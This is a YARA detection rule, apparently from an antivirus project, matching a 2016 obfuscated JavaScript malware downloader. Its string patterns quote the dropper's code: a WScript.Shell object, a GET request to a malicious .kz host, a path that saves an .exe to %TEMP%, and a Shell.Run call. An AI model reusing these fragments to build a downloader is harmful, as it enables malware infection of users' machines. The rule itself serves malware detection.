rule sig_20160330_fac493dbb12a0917f1c22736d7b18a2f {
  meta:
    description = "datamaliciousorder - file 20160330_fac493dbb12a0917f1c22736d7b18a2f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b56ddaa3c773dab2c168386122583f77b6571cbddfb26f1be54b67f7fd64fac9"

  strings:
    $s1  = "var _NW = function _M0() {return WScript[_NF](\"WScript\"+\".Shell\");}(), _W0 = 11;" fullword ascii
    $s2  = "_Y0[_A](\"GET\", \"http://zakazdetali.kz/v7bsad\", false);" fullword ascii
    $s3  = "function _AG(_I, _M2){_XS = _XS * 1; return _I - _M2;};" fullword ascii
    $s4  = "if (_Y0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _VC() {return _NW[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"CWEFcqcR5XmYQ.ex\" + \"e\";};" fullword ascii
    $s6  = "function _F(){return _UV + \"\";};" fullword ascii
    $s7  = "function _M() {return ((_VY == true) && (_VY == _LL)) ? 1 : _XS;};" fullword ascii
    $s8  = "function _X(_T){_NW[\"Run\"](_T, _XS, _XS);};" fullword ascii
    $s9  = "function _O(){return 22;};" fullword ascii
    $s10 = "function _Y()" fullword ascii
    $s11 = "var _T0 = new this[\"Date\"]();" fullword ascii
    $s12 = " while (_A0){" fullword ascii
    $s13 = "function _G(){return _NF;};" fullword ascii
    $s14 = "function _VP(_O0) {var _PK = (1, 2, 3, 4, 5, _O0); return _PK;};" fullword ascii
    $s15 = "return _AG(_M1, _AE);" fullword ascii
    $s16 = "var _VY = false;" fullword ascii
    $s17 = "_VY = true; " fullword ascii
    $s18 = "_LL = true; " fullword ascii
    $s19 = "var _LL = false;" fullword ascii
    $s20 = "var _EA = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}